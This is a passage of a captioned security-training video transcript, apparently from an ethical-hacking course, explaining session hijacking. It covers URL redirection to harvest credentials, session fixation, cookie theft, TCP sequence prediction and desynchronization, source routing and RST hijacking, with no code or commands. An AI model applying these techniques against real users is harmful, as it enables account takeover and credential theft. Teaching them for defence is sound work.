this\nis again why we automate a lot of stuff,\n\n586\n00:25:01.987 --> 00:25:04.960\nwe have scripts that will do these,\nwe know what we're looking for.\n\n587\n00:25:04.960 --> 00:25:07.106\nSo we could go through and\nautomate that and\n\n588\n00:25:07.106 --> 00:25:11.160\nhave it just literally walk through and\nsay okay every instance of facebook.com\n\n589\n00:25:11.160 --> 00:25:13.748\nmake that anti-facebook.com or\nwhatever it is.\n\n590\n00:25:13.748 --> 00:25:16.460\n&gt;&gt; Mm-hm.\n&gt;&gt; Or facebook.com and just an extra added\n\n591\n00:25:16.460 --> 00:25:19.540\nlittle bit on the URL so that people\ndon't realize what that will be.\n\n592\n00:25:19.540 --> 00:25:23.630\nAnd then as a result, what we will do or\nwhat will ultimately happen if we\n\n593\n00:25:23.630 --> 00:25:28.240\nare successful is that we will be able\nto as I said redirect everybody right?\n\n594\n00:25:28.240 --> 00:25:32.110\nAnd then Titus is gonna keep busy over\nthere capturing user names and passwords.\n\n595\n00:25:32.110 --> 00:25:34.140\n&gt;&gt; Yeah. [LAUGH] &gt;&gt; And\nhe's gonna make sure he has a list for\n\n596\n00:25:34.140 --> 00:25:35.200\nus at the end of the\n&gt;&gt; All right.\n\n597\n00:25:35.200 --> 00:25:36.250\n&gt;&gt; At the end of the day today.\n\n598\n00:25:37.550 --> 00:25:41.250\nCan we go to Mike's machine and just show\nyou a download that piece of software.\n\n599\n00:25:41.250 --> 00:25:44.000\nAll right so the OWASP Zed Attack Proxy.\n\n600\n00:25:44.000 --> 00:25:44.990\nAnother really cool tool.\n\n601\n00:25:44.990 --> 00:25:46.750\nIt's called ZAP generically, right?\n\n602\n00:25:46.750 --> 00:25:47.970\nAnd it's made by a OWASP.\n\n603\n00:25:47.970 --> 00:25:50.880\nNow remember, this is not\na hacking tool first and foremost.\n\n604\n00:25:50.880 --> 00:25:55.120\nThis isn't normal a proxy tool, but\nit can be used as any proxy can.\n\n605\n00:25:55.120 --> 00:25:59.880\nIt can be used to do something\nlike this if we actually want to.\n\n606\n00:25:59.880 --> 00:26:02.750\nAnd so this is just something\nto consider and to be aware of.\n\n607\n00:26:02.750 --> 00:26:07.070\n&gt;&gt; It is interesting that they made it\nawfully easy in this security tool,\n\n608\n00:26:07.070 --> 00:26:10.300\nto manipulate back, cuz I know a lot\nof proxies do the same process.\n\n609\n00:26:10.300 --> 00:26:13.656\nBut they don't let you freeze packets and\nmodify the packets do they?\n\n610\n00:26:13.656 --> 00:26:14.255\n&gt;&gt; Well.\n\n611\n00:26:14.255 --> 00:26:15.421\n&gt;&gt; In most proxies?\n\n612\n00:26:15.421 --> 00:26:16.790\n&gt;&gt; No comment.\n\n613\n00:26:16.790 --> 00:26:18.190\n&gt;&gt; Okay.\n[LAUGH]\n\n614\n00:26:18.190 --> 00:26:19.890\n&gt;&gt; Let's just say that knowledge is power.\n\n615\n00:26:19.890 --> 00:26:20.840\nLet's put it that way.\n\n616\n00:26:20.840 --> 00:26:21.970\n&gt;&gt; Okay. [LAUGH] &gt;&gt; All right so\n\n617\n00:26:21.970 --> 00:26:25.870\nyou could see how this would potentially\ntake place and we obviously want to make\n\n618\n00:26:25.870 --> 00:26:29.420\nsure we're aware of this\n&gt;&gt; Just a little behind the scenes look at\n\n619\n00:26:29.420 --> 00:26:31.060\nthe magic if you will, right.\n\n620\n00:26:31.060 --> 00:26:33.040\nPay no attention to the man\nbehind the curtain.\n\n621\n00:26:33.040 --> 00:26:34.220\n&gt;&gt; That's right.\n\n622\n00:26:34.220 --> 00:26:35.860\n&gt;&gt; Said the Wizard of Oz.\n\n623\n00:26:35.860 --> 00:26:38.630\nAlright, so there's a lot of\ndifferent ways we can execute session\n\n624\n00:26:38.630 --> 00:26:39.850\nhijacking attacks.\n\n625\n00:26:39.850 --> 00:26:42.410\nRemember replay attacks\ncan happen just easily.\n\n626\n00:26:42.410 --> 00:26:43.380\nWe can use the session ID,\n\n627\n00:26:43.380 --> 00:26:47.500\nwe've talked about this before in the last\nepisode where if we're not careful\n\n628\n00:26:47.500 --> 00:26:51.720\nthose ID's time, there are single use and\nthere are session timeout values that\n\n629\n00:26:51.720 --> 00:26:56.130\nreplay attacks can easily be propagated\nhere, so wanna be aware of that.\n\n630\n00:26:56.130 --> 00:26:59.900\nWe can compromise session IDs using\nwhat's called a session fixation attack.\n\n631\n00:26:59.900 --> 00:27:03.310\nThis is an attack that allows the attacker\nto hijack a valid user session,\n\n632\n00:27:03.310 --> 00:27:04.660\nas we've been talking about.\n\n633\n00:27:04.660 --> 00:27:08.300\nWe try to get the victim to essentially\nauthenticate themselves with a known\n\n634\n00:27:08.300 --> 00:27:12.050\nsession ID, then we hijack the session,\nand we take it over.\n\n635\n00:27:12.050 --> 00:27:15.000\nSo by doing that,\nwe're then able to assume their identity.\n\n636\n00:27:15.000 --> 00:27:16.640\nThere's different ways you could do that.\n\n637\n00:27:16.640 --> 00:27:17.910\nYou could use hidden form fields,\n\n638\n00:27:17.910 --> 00:27:20.880\nwhich we talked about in\nthe cross-site request forgery.\n\n639\n00:27:20.880 --> 00:27:25.060\nYou could use the URL argument with the\nsession token that could manipulate that.\n\n640\n00:27:25.060 --> 00:27:28.580\nYou can use session IDs in a cookie,\nand if you're doing that one,\n\n641\n00:27:28.580 --> 00:27:31.260\nmay be able to steal the cookie and\ndo those kinda things.\n\n642\n00:27:31.260 --> 00:27:34.630\nSo there's different ways for\nus to able to execute that.\n\n643\n00:27:34.630 --> 00:27:38.270\nCookies and other insidiously evil\ninvention of modern computing.\n\n644\n00:27:38.270 --> 00:27:40.780\n&gt;&gt; Yes.\n&gt;&gt; I happen to like oatmeal raisin\n\n645\n00:27:40.780 --> 00:27:42.370\ncookies, actually, that's my preference.\n\n646\n00:27:42.370 --> 00:27:44.740\nBut yeah, you don't get to choose,\nyou just get cookies, so.\n\n647\n00:27:44.740 --> 00:27:47.770\n&gt;&gt; One of my favorite little cartoons\nis just a picture of the Cookie Monster\n\n648\n00:27:47.770 --> 00:27:48.930\nsitting in front of computer.\n\n649\n00:27:48.930 --> 00:27:52.962\nAnd he's got his finger over the button\nand he's got the whole Delete cookies and\n\n650\n00:27:52.962 --> 00:27:54.929\nthere's a big scared look on his face.\n\n651\n00:27:54.929 --> 00:27:57.361\n[LAUGH]\n&gt;&gt; Yep you can learn a lot from\n\n652\n00:27:57.361 --> 00:27:59.569\nSesame Street there's no doubt about it.\n\n653\n00:27:59.569 --> 00:28:01.402\n&gt;&gt; You can.\n&gt;&gt; Did you hear that they actually forced\n\n654\n00:28:01.402 --> 00:28:02.980\nsome of those people to retire?\n\n655\n00:28:02.980 --> 00:28:03.960\n&gt;&gt; Did they really?\n\n656\n00:28:03.960 --> 00:28:07.240\n&gt;&gt; So there were a couple of\nthe characters the humans right that were\n\n657\n00:28:07.240 --> 00:28:10.385\nobviously had been on the show\nalmost since the beginning.\n\n658\n00:28:10.385 --> 00:28:13.258\n&gt;&gt; Mm-hm.\n&gt;&gt; I think Bob was one of them, there was,\n\n659\n00:28:13.258 --> 00:28:16.685\nI forget his name,\nI forget the actor's name but\n\n660\n00:28:16.685 --> 00:28:21.531\nhe is in his 80 now, I think it is\nmid to late 80s and they finally,\n\n661\n00:28:21.531 --> 00:28:26.150\nI think you could politely arrange for\nhim or he didn't wanna go.\n\n662\n00:28:26.150 --> 00:28:28.253\n&gt;&gt; Uh-huh.\n&gt;&gt; I think but they kind of got the point.\n\n663\n00:28:28.253 --> 00:28:31.619\nAnd so recently, sometime of\nthe last month or two this year,\n\n664\n00:28:31.619 --> 00:28:35.190\nthey kind of announce like he's on,\nhe's out basically.\n\n665\n00:28:35.190 --> 00:28:38.810\nThey replaced him with somebody\nyounger and I think his wife as well.\n\n666\n00:28:38.810 --> 00:28:39.670\nHe was married to\n\n667\n00:28:39.670 --> 00:28:41.710\non the show to one of the characters\n&gt;&gt; Okay.\n\n668\n00:28:41.710 --> 00:28:42.550\n&gt;&gt; For many years.\n\n669\n00:28:42.550 --> 00:28:46.000\nYou know one of the couples that was there\nand she had retired I think earlier,\n\n670\n00:28:46.000 --> 00:28:47.820\neither last year or something like that.\n\n671\n00:28:47.820 --> 00:28:49.080\nThe character that played his wife.\n\n672\n00:28:49.080 --> 00:28:52.910\nBut they essentially, he's gone,\nyou know, they kinda moved him out, but\n\n673\n00:28:52.910 --> 00:28:55.620\nhe was there for\nsome crazy amount of time.\n\n674\n00:28:55.620 --> 00:28:57.680\n30 or 40 years or something like that.\n\n675\n00:28:57.680 --> 00:28:58.610\n&gt;&gt; Wow.\n&gt;&gt; So, yeah, just kind of\n\n676\n00:28:58.610 --> 00:28:59.320\ninteresting, right?\n\n677\n00:28:59.320 --> 00:29:00.384\nWho would've thought?\n\n678\n00:29:00.384 --> 00:29:01.080\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n679\n00:29:01.080 --> 00:29:03.508\nyou can learn a lot from Sesame Street.\n\n680\n00:29:03.508 --> 00:29:04.153\n&gt;&gt; Yeah.\n\n681\n00:29:04.153 --> 00:29:07.237\n&gt;&gt; Did you ever watch, we were just\ntalking about, the whole Kansas thing?\n\n682\n00:29:07.237 --> 00:29:09.023\nSo you may not have gotten it out there.\n\n683\n00:29:09.023 --> 00:29:10.446\n&gt;&gt; [LAUGH]\n&gt;&gt; Because you know it was not.\n\n684\n00:29:10.446 --> 00:29:13.100\n&gt;&gt; Tumbleweeds [INAUDIBLE]\n&gt;&gt; Yeah you didn't necessarily have\n\n685\n00:29:13.100 --> 00:29:13.900\nthe most recent things.\n\n686\n00:29:13.900 --> 00:29:16.030\nI have this conversation with my\nwife a lot too because she grew\n\n687\n00:29:16.030 --> 00:29:19.190\nup in the Caribbean and they didn't\nalways get some of the TV programs and\n\n688\n00:29:19.190 --> 00:29:20.900\nthings like the main ones you would get.\n\n689\n00:29:20.900 --> 00:29:22.590\nBut not necessarily all\nthe ones that we would've seen.\n\n690\n00:29:22.590 --> 00:29:25.140\nSee in the US that we would\nconsider mainstream here.\n\n691\n00:29:25.140 --> 00:29:26.800\nBecause they didn't always\nbroadcast them all.\n\n692\n00:29:26.800 --> 00:29:28.770\nDid you ever watch, Que Pasa USA?\n\n693\n00:29:28.770 --> 00:29:30.250\n&gt;&gt; No.\n&gt;&gt; Or, Electric Company?\n\n694\n00:29:30.250 --> 00:29:31.620\n&gt;&gt; I did watch, Electric Company.\n\n695\n00:29:31.620 --> 00:29:32.330\n&gt;&gt; Okay so you remember.\n\n696\n00:29:32.330 --> 00:29:34.080\nQue Pasa USA was more,\nit may have been more.\n\n697\n00:29:34.080 --> 00:29:38.200\nIt was a south Florida thing and\nit was popular in other areas, but\n\n698\n00:29:38.200 --> 00:29:39.720\nthey did it in south Florida.\n\n699\n00:29:39.720 --> 00:29:41.890\nEspecially but\nit was like a Spanish version.\n\n700\n00:29:41.890 --> 00:29:45.240\nIt was English but it was like\na Spanish version of Sesame Street or\n\n701\n00:29:45.240 --> 00:29:47.140\nElectric Company, that kind of thing.\n\n702\n00:29:47.140 --> 00:29:49.920\nBut the Electric Company\nwas really cool too.\n\n703\n00:29:49.920 --> 00:29:50.460\n&gt;&gt; It was.\n&gt;&gt; Yeah.\n\n704\n00:29:52.000 --> 00:29:52.990\nThe good old days.\n\n705\n00:29:52.990 --> 00:29:54.130\n&gt;&gt; The good old days.\n&gt;&gt; The good old days.\n\n706\n00:29:54.130 --> 00:29:58.850\nAll right so, you mentioned that zap and\nthe zap proxy was kind of like hijacking\n\n707\n00:29:58.850 --> 00:30:01.590\nand doing a man in the proxy as\nopposed to man in the middle and\n\n708\n00:30:01.590 --> 00:30:04.840\nyeah we can do session hijacking using\nproxy services I've just showed you.\n\n709\n00:30:04.840 --> 00:30:08.710\nSo just something to be aware of we\ncan provide the ability to be able to\n\n710\n00:30:08.710 --> 00:30:12.520\ncontrol those links and control that\nflow as it comes through the system and\n\n711\n00:30:12.520 --> 00:30:14.101\ninteract with it and manipulate it.\n\n712\n00:30:14.101 --> 00:30:18.110\nSo this are all examples of application\nlevel hijacking that take place and\n\n713\n00:30:18.110 --> 00:30:21.950\nwe can also talk about at the network\nlevel due session and hijacking.\n\n714\n00:30:21.950 --> 00:30:24.110\nBlind hijacking can exist at this level.\n\n715\n00:30:25.120 --> 00:30:30.670\nUDP and TCP hijacking, manipulation of the\nSYN-ACK setup and things of that nature.\n\n716\n00:30:30.670 --> 00:30:33.140\nReset hijacking,\nmanipulation of the flags.\n\n717\n00:30:33.140 --> 00:30:36.310\nWe've talked about man in the middle,\nwith packet sniffing, IP spoofing, and\n\n718\n00:30:36.310 --> 00:30:40.670\nsource routing, can be used to manipulate\nhijacking and do things things as well.\n\n719\n00:30:40.670 --> 00:30:42.270\nSo, lots of different\nways this may happen.\n\n720\n00:30:43.460 --> 00:30:48.870\nWhen we think about the three way\nhandshake remember SIN, SINAC, AC, right?\n\n721\n00:30:48.870 --> 00:30:52.820\nWhen we talk about the TCP through\na handshake we could manipulate that if we\n\n722\n00:30:52.820 --> 00:30:57.040\ncan anticipate the next sequence,\nthe next sequence and the ACK number,\n\n723\n00:30:57.040 --> 00:31:00.460\nthen we actually can potentially get in\nthe middle there and manipulate that.\n\n724\n00:31:00.460 --> 00:31:04.750\nAnd again, if we can screw that up or\nsomehow interact and perhaps take over,\n\n725\n00:31:04.750 --> 00:31:08.390\nwe can be authenticated as opposed\nto the user that initialized that.\n\n726\n00:31:08.390 --> 00:31:11.610\nAnd so we wanna think about that cuz we\ncan spoof the address of the person that\n\n727\n00:31:11.610 --> 00:31:13.150\ninitialized the communication.\n\n728\n00:31:13.150 --> 00:31:16.170\nTake over that communication and\nthen pretend to be them.\n\n729\n00:31:16.170 --> 00:31:19.120\nThis is really all about\nultimately session hijacking.\n\n730\n00:31:19.120 --> 00:31:23.500\nIt's about either masquerading or\nessentially it's the same thing.\n\n731\n00:31:23.500 --> 00:31:24.960\nWe can call it spoofing or masquerading.\n\n732\n00:31:24.960 --> 00:31:30.230\nWe make the distinction of the sense that\nwe don't always pretend to be somebody.\n\n733\n00:31:30.230 --> 00:31:33.516\nWe try to take over their legitimate\nsession as opposed to starting our own.\n\n734\n00:31:33.516 --> 00:31:35.665\nThere's some distinction there but\ngenerically,\n\n735\n00:31:35.665 --> 00:31:38.733\nif you just boil it down at the end of\nthe day and just talk about the concept,\n\n736\n00:31:38.733 --> 00:31:41.836\nregardless of how we get there,\nwe're impersonating somebody, right?\n\n737\n00:31:41.836 --> 00:31:45.374\nWhether we Start out that way, or\nwe let somebody start the session, and\n\n738\n00:31:45.374 --> 00:31:47.820\nthen we'd kick them out and\ntake them over.\n\n739\n00:31:47.820 --> 00:31:50.510\nIt's ultimately us pretending to be them,\nand\n\n740\n00:31:50.510 --> 00:31:51.710\nthat's what's at the heart of all this.\n\n741\n00:31:51.710 --> 00:31:54.650\nSo any of these kind of attacks\nare structured that way,\n\n742\n00:31:54.650 --> 00:31:56.115\nif you think about the logic.\n\n743\n00:31:56.115 --> 00:32:00.560\nTCP/IP hijacking, we can use spoof\npackets to take over a connection between\n\n744\n00:32:00.560 --> 00:32:02.998\nthe victim, obviously, and the server.\n\n745\n00:32:02.998 --> 00:32:05.866\nWhatever it is we're\nlooking to manipulate.\n\n746\n00:32:05.866 --> 00:32:07.625\nIf we can do that we\ncan get in the middle.\n\n747\n00:32:07.625 --> 00:32:10.965\nAnd again, we have to be on the same\nphysical network as the victim to do this.\n\n748\n00:32:10.965 --> 00:32:13.154\nSo we have to be inside the firewall.\n\n749\n00:32:13.154 --> 00:32:17.114\nWe've talked out in about the fact that\nthere are a lot of concerns within cyber\n\n750\n00:32:17.114 --> 00:32:17.654\nattacks.\n\n751\n00:32:17.654 --> 00:32:20.027\nAnd we don't often pay as much\nattention to them we should.\n\n752\n00:32:20.027 --> 00:32:23.546\nI believe, if I'm not mistaken,\nthat we put the TCP/IP hacking,\n\n753\n00:32:23.546 --> 00:32:25.356\nhijacking process up on the list.\n\n754\n00:32:25.356 --> 00:32:30.290\nKinda walk through the steps involved\nwith that on our little hit list that\n\n755\n00:32:30.290 --> 00:32:31.890\nI put together for you.\n\n756\n00:32:31.890 --> 00:32:34.380\nSo, if we could, when you're ready,\nif we could just gonna go through.\n\n757\n00:32:34.380 --> 00:32:37.430\nI'd like to talk about that real quick,\nand show you guys how that works.\n\n758\n00:32:37.430 --> 00:32:38.560\nSo let's take a look.\n\n759\n00:32:38.560 --> 00:32:41.738\nWe've got the steps involved.\n\n760\n00:32:41.738 --> 00:32:44.334\nI think we've got a total of 7 steps,\nif I remember correctly.\n\n761\n00:32:44.334 --> 00:32:46.406\nIf I'm not mistaken on there.\n\n762\n00:32:46.406 --> 00:32:47.966\nLet's go through and see what they are.\n\n763\n00:32:47.966 --> 00:32:51.551\nStep 1, the attacker,\nI keep dropping my first syllable.\n\n764\n00:32:51.551 --> 00:32:52.411\nThe tacker.\n\n765\n00:32:52.411 --> 00:32:55.204\n&gt;&gt; [LAUGH]\n&gt;&gt; The attacker, let me enunciate and\n\n766\n00:32:55.204 --> 00:32:56.208\nspeak clearly.\n\n767\n00:32:56.208 --> 00:32:58.665\nThe attacker will sniff\nthe victim's connection.\n\n768\n00:32:58.665 --> 00:33:02.330\nAs you can see, there, they use\nthe victim IP to send spoofed packets.\n\n769\n00:33:02.330 --> 00:33:04.540\nThey're doing a sequence\nprediction attack here.\n\n770\n00:33:04.540 --> 00:33:06.310\nSo they're going to have\nthe predicted sequence numbers.\n\n771\n00:33:06.310 --> 00:33:09.380\nWe've talked about how that's going\nto happen and why that's important.\n\n772\n00:33:09.380 --> 00:33:11.850\nThe receiver processes\nthat spoofed packet.\n\n773\n00:33:11.850 --> 00:33:14.750\nIncrements the sequence\nnumber as they will do.\n\n774\n00:33:14.750 --> 00:33:16.700\nAnd sends the acknowledgement\nto the victim's IP.\n\n775\n00:33:16.700 --> 00:33:19.570\nBut remember,\nthe attacker is now spoofing, right?\n\n776\n00:33:19.570 --> 00:33:23.110\nSo the victim's machine is\nunaware of the spoofed packet.\n\n777\n00:33:23.110 --> 00:33:27.220\nSo it ignores that receiver's machine ACK\nand turns the sequence number count off.\n\n778\n00:33:27.220 --> 00:33:28.230\nSo they stop paying attention.\n\n779\n00:33:28.230 --> 00:33:29.814\nThey're like well,\nI don't talk to strangers.\n\n780\n00:33:29.814 --> 00:33:31.512\nStranger danger, I don't know who you are.\n\n781\n00:33:31.512 --> 00:33:32.640\nI'm not gonna talk to you.\n\n782\n00:33:32.640 --> 00:33:34.780\nBut the problem is we've\nalready established a session.\n\n783\n00:33:34.780 --> 00:33:39.004\nNow the victim is unaware of the fact\nwe have a session on their behalf.\n\n784\n00:33:39.004 --> 00:33:43.215\nThey've chosen to essentially ignore\nall further communication because they\n\n785\n00:33:43.215 --> 00:33:44.357\nhave no record of it.\n\n786\n00:33:44.357 --> 00:33:46.112\nAnd so now it says, as a result,\n\n787\n00:33:46.112 --> 00:33:49.892\nthe receiver receives packets with\nthe incorrect sequence number.\n\n788\n00:33:49.892 --> 00:33:54.113\nBecause they no longer have\nthat going back and forth,\n\n789\n00:33:54.113 --> 00:33:58.080\nin terms of the conversation\ntheir keeping track.\n\n790\n00:33:58.080 --> 00:34:01.490\nSo the attacker forces the victim's\nconnection with the receiver machine to\n\n791\n00:34:01.490 --> 00:34:02.510\na desynchronized state.\n\n792\n00:34:02.510 --> 00:34:06.430\nThey essentially now, the attacker knocks\nthe victim out because they say, well,\n\n793\n00:34:06.430 --> 00:34:07.250\nyou're not paying attention.\n\n794\n00:34:07.250 --> 00:34:08.350\nLet's get you out of here.\n\n795\n00:34:08.350 --> 00:34:09.190\nI wanna take that over.\n\n796\n00:34:09.190 --> 00:34:10.698\nI wanna pick that up and start going.\n\n797\n00:34:10.698 --> 00:34:15.940\nThe attacker will now track sequence\nnumbers and continuously spoof packets.\n\n798\n00:34:15.940 --> 00:34:18.780\nAnd now they're able to\ncontinue the communication.\n\n799\n00:34:18.780 --> 00:34:19.757\nSo they can just jump right in.\n\n800\n00:34:19.757 --> 00:34:23.537\nThey can push you out of the way, after\nyou've established the initial connection\n\n801\n00:34:23.537 --> 00:34:25.974\nand you've been told to stop\npaying attention to it.\n\n802\n00:34:25.974 --> 00:34:29.160\nAnd they step in and say, no, no,\nI actually wanted to talk to you.\n\n803\n00:34:29.160 --> 00:34:31.610\nAnd they continue the conversation\nwithout your knowledge.\n\n804\n00:34:31.610 --> 00:34:33.100\nMeaning, without the victim's knowledge.\n\n805\n00:34:33.100 --> 00:34:37.044\nSo this is how, actually,\nan attack would occur.\n\n806\n00:34:37.044 --> 00:34:39.937\nOr specifically,\nhow TCP/IP hijacking would occur,\n\n807\n00:34:39.937 --> 00:34:42.890\nif we were to look at\nthe specific steps involved.\n\n808\n00:34:42.890 --> 00:34:44.110\nAgain, very straightforward and\n\n809\n00:34:44.110 --> 00:34:49.030\nsimple if we think about the logic of\nthe steps and flow associated with it.\n\n810\n00:34:49.030 --> 00:34:50.329\nNot incredibly complicated.\n\n811\n00:34:50.329 --> 00:34:52.859\n&gt;&gt; There's a lot of steps just to\ngo ahead and kinda time it out.\n\n812\n00:34:52.859 --> 00:34:56.814\nBut when you think about what actually\nhappens, it's a very quick process.\n\n813\n00:34:56.814 --> 00:34:59.347\nWe're talking about milliseconds\nto do the send ACK back and forth.\n\n814\n00:34:59.347 --> 00:35:00.903\nSo we're not talking about a lot of time.\n\n815\n00:35:00.903 --> 00:35:02.633\nAgain, this is automated, traditionally.\n\n816\n00:35:02.633 --> 00:35:04.373\nWe've got a scanner running, and\n\n817\n00:35:04.373 --> 00:35:07.610\nwe've got visibility into\nthe packet stream in real time.\n\n818\n00:35:07.610 --> 00:35:10.630\nWe're able to then, you'll launch\nan attack from a separate console to\n\n819\n00:35:10.630 --> 00:35:13.440\ndesychronize the victim and\nget them out of the way.\n\n820\n00:35:13.440 --> 00:35:16.370\nAll we have to do is knock their\nsystem offline for a minute.\n\n821\n00:35:16.370 --> 00:35:17.380\nWe don't even have to restart it.\n\n822\n00:35:17.380 --> 00:35:19.219\nWe just have to block communication.\n\n823\n00:35:19.219 --> 00:35:20.390\nSomehow overwhelm them, or\n\n824\n00:35:20.390 --> 00:35:24.700\njust not allow them to be a part of that\nstream long enough for us to take control.\n\n825\n00:35:24.700 --> 00:35:25.293\nAnd that's easily done.\n\n826\n00:35:25.293 --> 00:35:26.859\nThat's not very hard to do.\n\n827\n00:35:26.859 --> 00:35:28.624\nAnd so as a result, this is very quick.\n\n828\n00:35:28.624 --> 00:35:30.552\nAnd once this is done,\n[SOUND] we're in there.\n\n829\n00:35:30.552 --> 00:35:31.538\nThat wasn't a good one.\n\n830\n00:35:31.538 --> 00:35:32.457\n[SOUND] That's better.\n\n831\n00:35:32.457 --> 00:35:32.980\n&gt;&gt; There we go.\n\n832\n00:35:32.980 --> 00:35:34.770\n&gt;&gt; We're in there just like that, right?\n\n833\n00:35:34.770 --> 00:35:37.790\nAnd as a result,\nwe now own the communication channel.\n\n834\n00:35:37.790 --> 00:35:39.400\nWe could be doing whatever we want, and\n\n835\n00:35:39.400 --> 00:35:41.940\nI am pretending to be you\nwhile I'm doing that.\n\n836\n00:35:41.940 --> 00:35:43.770\nAnd the server,\nthe end server we're talking to,\n\n837\n00:35:43.770 --> 00:35:46.390\ndoesn't know, has no knowledge of\nthe fact that we've done that.\n\n838\n00:35:46.390 --> 00:35:48.895\nAs a matter of fact, Mike and\nI swapped places while I was talking.\n\n839\n00:35:48.895 --> 00:35:50.217\n&gt;&gt; [LAUGH]\n&gt;&gt; This is really Mike.\n\n840\n00:35:50.217 --> 00:35:53.470\nYou see those commercials where they,\nExxon has one.\n\n841\n00:35:53.470 --> 00:35:54.691\nFreaked me out the first time I saw it.\n\n842\n00:35:54.691 --> 00:35:56.940\nThe gas commercial,\nthey got the guy standing at the pump.\n\n843\n00:35:56.940 --> 00:35:58.790\nAnd these are the seven fuel additives.\n\n844\n00:35:58.790 --> 00:36:01.800\nAnd the woman pops up out of\nthe top of the minivan, and\n\n845\n00:36:01.800 --> 00:36:03.375\nanother guy's over there at the pump.\n\n846\n00:36:03.375 --> 00:36:06.370\nBut it's a woman, then they pull\nthe whole body mask off and it's a guy.\n\n847\n00:36:06.370 --> 00:36:07.840\nAnd there's a guy behind the car.\n\n848\n00:36:07.840 --> 00:36:09.497\n&gt;&gt; [LAUGH]\n&gt;&gt; Yeah, that was kinda bizarre.\n\n849\n00:36:09.497 --> 00:36:12.043\nBut it's like one of those,\nit's like the Mission Impossible thing.\n\n850\n00:36:12.043 --> 00:36:15.242\nIf Mike actually removes the face mask,\nit's gonna be him, not me.\n\n851\n00:36:15.242 --> 00:36:17.864\n&gt;&gt; [LAUGH]\n&gt;&gt; But I'm not wearing a red shirt.\n\n852\n00:36:17.864 --> 00:36:21.718\nSo I don't have to worry about being\ncrushed by some sort of falling object,\n\n853\n00:36:21.718 --> 00:36:24.923\nthe whole Star Trek effect that\nwe were talking about earlier.\n\n854\n00:36:24.923 --> 00:36:26.924\nWe could also talk about\nsource routed packets.\n\n855\n00:36:26.924 --> 00:36:29.079\nIP spoofing could take place\nthrough source routing.\n\n856\n00:36:29.079 --> 00:36:30.874\nWe talked about source routing before.\n\n857\n00:36:30.874 --> 00:36:34.595\nThe knowledge of the fact that the sender,\nand a lot of people often forget this,\n\n858\n00:36:34.595 --> 00:36:35.922\nwhen we talk about TCP/IP.\n\n859\n00:36:35.922 --> 00:36:40.750\nBut the sender of a packet has the ability\nto specify the route, if they choose to.\n\n860\n00:36:40.750 --> 00:36:43.450\nWe often just kinda step back and\nsay, okay, no problem.\n\n861\n00:36:43.450 --> 00:36:46.360\nTake on this responsibility,\nMister and Misses Router, and\n\n862\n00:36:46.360 --> 00:36:48.400\njust automatically take care of it for me.\n\n863\n00:36:48.400 --> 00:36:49.040\nYou'll figure it out.\n\n864\n00:36:49.040 --> 00:36:51.560\nThat's what routing protocols are for,\nright?\n\n865\n00:36:51.560 --> 00:36:53.520\nBut the reality is,\nwe can actually hard-code that and\n\n866\n00:36:53.520 --> 00:36:55.520\nmake the decision ourselves if we want to.\n\n867\n00:36:55.520 --> 00:37:00.120\nSo if we're doing that, we actually can\ndecide, as a hacker, as a bad actor,\n\n868\n00:37:00.120 --> 00:37:01.930\nthat I wanna hard-code paths.\n\n869\n00:37:01.930 --> 00:37:04.964\nAnd I can manipulate traffic by using\nsource route exploits to be able\n\n870\n00:37:04.964 --> 00:37:05.494\nto do this.\n\n871\n00:37:05.494 --> 00:37:09.172\nA little often forgotten and\noften misunderstood and\n\n872\n00:37:09.172 --> 00:37:11.430\nunderutilized capability.\n\n873\n00:37:11.430 --> 00:37:13.750\nBut one that hackers obviously\nwill pay attention to.\n\n874\n00:37:13.750 --> 00:37:17.493\nWhat about reset hijacking,\nthe reset flag, the RST flag.\n\n875\n00:37:17.493 --> 00:37:20.633\nThis involves an authentic-looking\nauthenticator, or\n\n876\n00:37:20.633 --> 00:37:24.924\nauthentic-looking reset flag packet\nthat is gonna spoof source addresses and\n\n877\n00:37:24.924 --> 00:37:27.500\npredict, again, acknowledgement numbers.\n\n878\n00:37:27.500 --> 00:37:30.710\nWe're dealing with\nmanipulating that information.\n\n879\n00:37:30.710 --> 00:37:33.306\nIf we could do that and\nwe can send that to the victim,\n\n880\n00:37:33.306 --> 00:37:34.782\nwe can reset the connection.\n\n881\n00:37:34.782 --> 00:37:37.990\nIf we're able to get the right\nsequence number and everything.\n\n882\n00:37:37.990 --> 00:37:40.570\nWe can essentially tell them,\nhey, don't pay attention.\n\n883\n00:37:40.570 --> 00:37:42.220\nAnd now I'm gonna go step in and use this.\n\n884\n00:37:42.220 --> 00:37:46.559\nAnd this is the actual second part of that\nTCP/IP hijacking we were talking about.\n\n885\n00:37:46.559 --> 00:37:49.097\nWhen I said it doesn't take\nmuch to actually go in and\n\n886\n00:37:49.097 --> 00:37:52.461\nget the victim to stop paying attention\nlong enough and cut them off.\n\n887\n00:37:52.461 --> 00:37:56.830\nA reset hijack could be part 2\nof that from a separate console.\n\n888\n00:37:56.830 --> 00:38:00.637\nBy the way, if you're gonna do this as\na hacker, you gotta have like not only\n\n889\n00:38:00.637 --> 00:38:04.740\nmoney, but you've got to have the ability\nto buy some really kicking gear.\n\n890\n00:38:04.740 --> 00:38:08.760\nYou've got to have this\n21-inch massive monitor walls.\n\n891\n00:38:08.760 --> 00:38:12.590\nYou gotta have four or five monitors and\nconsoles going all over the place.\n\n892\n00:38:12.590 --> 00:38:15.870\nThat's what you need because you gotta\nhave all these different tools open in all\n\n893\n00:38:15.870 --> 00:38:17.060\nthese different places.\n\n894\n00:38:17.060 --> 00:38:19.345\nThis is why people don't hack\noff of their cellphones,\n\n895\n00:38:19.345 --> 00:38:20.862\nbecause you can't see the windows.\n\n896\n00:38:20.862 --> 00:38:22.580\nThere's just not enough room.\n\n897\n00:38:22.580 --> 00:38:27.590\n&gt;&gt; But if you have a nice, big, huge,\nvideo display, then you're all set.\n\n898\n00:38:27.590 --> 00:38:28.709\n&gt;&gt; Nice little wall of TVs.\n\n899\n00:38:28.709 --> 00:38:30.330\n&gt;&gt; Yeah, yeah, something like that.\n\n900\n00:38:30.330 --> 00:38:31.110\nExactly.\nJust like that.\n\n901\n00:38:31.110 --> 00:38:32.430\nThat was me, actually.\nThat was not Mike.\n\n902\n00:38:32.430 --> 00:38:34.270\n&gt;&gt; [LAUGH]\n&gt;&gt; Remember, we switched.\n\n903\n00:38:34.270 --> 00:38:36.060\nThat's me wearing Mike's red shirt.\n\n904\n00:38:36.060 --> 00:38:37.880\nThe makeup here is incredible.\n\n905\n00:38:37.880 --> 00:38:39.932\n&gt;&gt; It is amazing.\n&gt;&gt; Incredible makeup artists here 